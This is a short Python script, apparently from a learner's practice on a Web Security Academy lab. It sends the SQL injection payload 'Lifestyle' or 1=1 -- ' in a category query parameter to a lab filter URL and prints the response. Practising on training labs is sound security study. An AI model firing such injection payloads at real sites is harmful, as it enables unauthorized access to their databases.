# connect  url with session and use try except , function with args

import requests 
from typing import Optional

BASE_URL = "https://0aac00e8032a337f82fbe830001d00cd.web-security-academy.net/filter"

session = requests.session();

# 因為回傳有可能none所以包optional示意
def send_request(url: str,params: dict[str,any], timeout: int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error: {e}" )
        return None

def main():
    payload = "Lifestyle' or 1=1 -- "
    response = send_request(BASE_URL,{"category": payload})
    if response and response.status_code==200:
        print(f"{response.text}")
        print(f"{len(response.text)}")
    else:
        print("connect fail")


if __name__ == "__main__":
    main()